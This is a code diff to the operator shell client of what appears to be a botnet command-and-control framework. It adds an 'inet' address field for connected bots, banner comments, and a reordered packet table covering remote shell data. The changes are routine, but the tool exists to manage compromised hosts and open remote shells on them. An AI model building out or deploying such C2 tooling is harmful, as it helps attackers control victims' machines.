@@ -6,6 +6,8 @@
 
 #include "sclient.h"
 
+/* ==============================================[[ PeerHashMap ]]=============================================== */
+
 typedef struct sShell_hashMapElem {
     int id;
     tShell_peer *peer;
@@ -24,13 +26,15 @@ uint64_t shell_ElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
     return *(uint64_t*)(u->pub); /* hashes pub key (first 8 bytes) */
 }
 
+/* ============================================[[ Packet Handlers ]]============================================= */
+
 void shellC_handleHandshakeRes(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     uint8_t endianness = laikaS_readByte(&peer->sock);
     peer->sock.flipEndian = endianness != laikaS_isBigEndian();
 }
 
 void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
-    char hostname[LAIKA_HOSTNAME_LEN], ipv4[LAIKA_IPV4_LEN];
+    char hostname[LAIKA_HOSTNAME_LEN], inet[LAIKA_INET_LEN], ipv4[LAIKA_IPV4_LEN];
     uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
     tShell_client *client = (tShell_client*)uData;
     tShell_peer *bot;
@@ -41,6 +45,7 @@ void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
 
     /* read hostname & ipv4 */
     laikaS_read(&peer->sock, hostname, LAIKA_HOSTNAME_LEN);
+    laikaS_read(&peer->sock, inet, LAIKA_INET_LEN);
     laikaS_read(&peer->sock, ipv4, LAIKA_IPV4_LEN);
 
     /* read peer's peerType */
@@ -51,7 +56,7 @@ void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
         return;
 
     /* create peer */
-    bot = shellP_newPeer(type, pubKey, hostname, ipv4);
+    bot = shellP_newPeer(type, pubKey, hostname, inet, ipv4);
 
     /* add peer to client */
     shellC_addPeer(client, bot);
@@ -102,6 +107,8 @@ void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
     shellC_closeShell(client);
 }
 
+/* ==============================================[[ Packet Table ]]============================================== */
+
 struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
         shellC_handleHandshakeRes,
@@ -109,21 +116,23 @@ struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_ADD_PEER_RES,
         shellC_handleAddPeer,
-        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_IPV4_LEN + sizeof(uint8_t),
+        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN + LAIKA_IPV4_LEN + sizeof(uint8_t),
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_RMV_PEER_RES,
         shellC_handleRmvPeer,
         crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t),
     false),
-    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_DATA,
-        shellC_handleShellData,
-        0,
-    true),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_CLOSE,
         shellC_handleShellClose,
         0,
     false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_DATA,
+        shellC_handleShellData,
+        0,
+    true),
 };
+
+/* ===============================================[[ Client API ]]=============================================== */
 
 void shellC_init(tShell_client *client) {
     size_t _unused;
@@ -345,5 +354,5 @@ void shellC_printInfo(tShell_peer *peer) {
     char buf[128];
 
     sodium_bin2hex(buf, sizeof(buf), peer->pub, crypto_kx_PUBLICKEYBYTES);
-    shellT_printf("\t%s@%s\n\tTYPE: %s\n\tPUBKEY: %s\n", peer->hostname, peer->ipv4, shellP_typeStr(peer), buf);
+    shellT_printf("\t%s@%s\n\tTYPE: %s\n\tPUBKEY: %s\n\tINET: %s\n", peer->hostname, peer->ipv4, shellP_typeStr(peer), buf, peer->inet);
 }
